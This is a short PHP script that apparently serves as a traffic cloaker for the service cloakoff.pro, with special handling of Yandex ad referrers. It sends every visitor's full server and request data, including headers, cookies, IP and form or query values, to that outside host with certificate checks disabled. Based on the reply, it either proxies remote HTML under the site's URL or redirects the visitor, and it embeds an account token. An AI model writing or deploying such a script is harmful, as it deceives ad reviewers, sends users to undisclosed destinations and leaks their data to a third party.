<?php
$mainserver = 'https://cloakoff.pro/';

if (isset($_SERVER['HTTP_REFERER'])) {
  if (stristr($_SERVER['HTTP_REFERER'], 'yabs.yandex')) {
    $_SERVER['HTTP_REFERER'] = 'yabs.yandex';
  }
}

$data = array(
  'user'         => 'v4oYd2G7jLSzxwb2ryBkCVgMu2XZor5gS3PwN759Ga0Wc8m1udojGuyuzUvK',
  'company'      => '176',
  'requestData'  => [
    'server'   => $_SERVER,
    'request'  => $_REQUEST,
  ],
);

$data = json_encode($data);
$ch = curl_init();
$optArray = array(
  CURLOPT_URL             => $mainserver . 'api/check',
  CURLOPT_RETURNTRANSFER  => true,
  CURLOPT_POST            => false,
  CURLOPT_SSL_VERIFYHOST  => false,
  CURLOPT_SSL_VERIFYPEER  => false,
  CURLOPT_POSTFIELDS      => $data,
  CURLOPT_HTTPHEADER      => [
    'Content-Type: application/json',
    'Content-Length: ' . strlen($data)
  ]
);

curl_setopt_array($ch, $optArray);

$result = curl_exec($ch);
curl_close($ch);
$result = json_decode($result, true);

$arrContextOptions=array(
    'ssl'=>array(
        'verify_peer'=>false,
        'verify_peer_name'=>false,
    ),
    'http' => array(
        'header' => 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0'
    )
);

if ($result['mode']=='load') {
  $html = file_get_contents($result['redirectUrl'], false, stream_context_create($arrContextOptions));
  $html = str_replace('<head>', '<head><base href="'.$result['redirectUrl'].'" />', $html);
  echo $html;
}
else if ($result['mode'] != 'load') {
    header('Location: '.$result['redirectUrl']);
}
?>



